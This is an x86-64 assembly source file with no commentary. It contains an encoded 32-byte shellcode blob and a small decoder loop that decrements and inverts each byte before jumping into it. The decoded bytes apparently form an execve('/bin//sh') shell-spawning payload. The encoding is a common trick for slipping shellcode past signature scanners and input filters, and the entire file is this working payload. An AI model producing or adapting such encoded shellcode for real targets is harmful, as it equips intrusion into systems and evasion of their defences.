global _start 

section .text

_start:

	jmp real_start

	encoded_shellcode: db 0xb8,0xcf,0x40,0xb0,0xb8,0x45,0xd1,0x9e,0x97,0x92,0xd1,0xd1,0x8d,0x98,0xad,0xb8,0x77,0x19,0xb0,0xb8,0x77,0x1e,0xa9,0xb8,0x77,0x1a,0xb8,0x7d,0x40,0xc5,0xf1,0xfb


real_start:
	
	lea rsi, [rel encoded_shellcode]


decoder:

	push 32
	pop rcx


decode:

	dec byte [rsi]
	not byte [rsi]
	inc rsi
	loop decode


	jmp short encoded_shellcode
